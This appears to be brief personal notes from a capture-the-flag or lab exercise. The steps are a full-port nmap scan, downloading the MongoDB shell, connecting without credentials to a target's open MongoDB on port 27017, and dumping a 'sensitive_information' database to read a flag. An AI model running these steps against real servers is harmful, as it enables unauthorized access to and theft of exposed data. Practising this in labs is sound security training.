sudo nmap -sV -p- --min-rate=1000

curl -O https://downloads.mongodb.com/compass/mongosh-2.3.2-linux-x64.tgz
tar xvf mongosh-2.3.2-linux-x64.tgz
cd mongosh-2.3.2-linux-x64/bin
./mongosh [[MongoDB]]://{target_IP}:27017
show dbs;
use sensitive_information;
show collections;
db.flag.find();

